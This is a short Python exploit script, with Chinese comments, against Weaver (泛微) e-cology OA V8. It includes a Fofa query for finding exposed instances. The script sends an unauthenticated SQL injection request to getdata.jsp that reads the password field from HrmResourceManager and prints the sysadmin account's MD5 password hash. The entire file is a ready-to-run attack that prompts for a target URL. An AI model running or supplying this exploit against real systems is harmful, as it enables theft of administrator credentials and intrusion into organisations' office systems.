# -*- coding: utf-8 -*-
# 泛微OA V8 前台 SQL注入获取管理员 sysadmin MD5的密码值
# Fofa:  app="泛微-协同办公OA"

import re
import requests
import urllib3
import urllib


def e_cology_v8_sqli(url):
    relsult = {
        'name': '泛微OA V8前台Sql注入',
        'vulnerable': False
    }
    target_url = urllib.parse.urljoin(url, "/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager")
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36"
    }

    try:
        urllib3.disable_warnings()
        res = requests.get(url=target_url, headers=headers, verify=False, timeout=3)
        verify = urllib.parse.urljoin(url, '/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%201234%20as%20id')
        v = requests.get(url=verify, headers=headers, verify=False, timeout=3)
        if res.status_code == 200 and 'html' not in res.text and re.search('1234', v.text):
            relsult['vulnerable'] = True
            relsult['user'] = 'sysadmin'
            relsult['MD5(password)'] = res.text.strip()
            relsult['payload'] = target_url
            relsult['about'] = 'https://blog.csdn.net/weixin_43227251/article/details/115653646'
            return relsult
        else:
            return relsult
    except:
        return relsult


if __name__ == "__main__":
    url = input('url:')
    print(e_cology_v8_sqli(url))
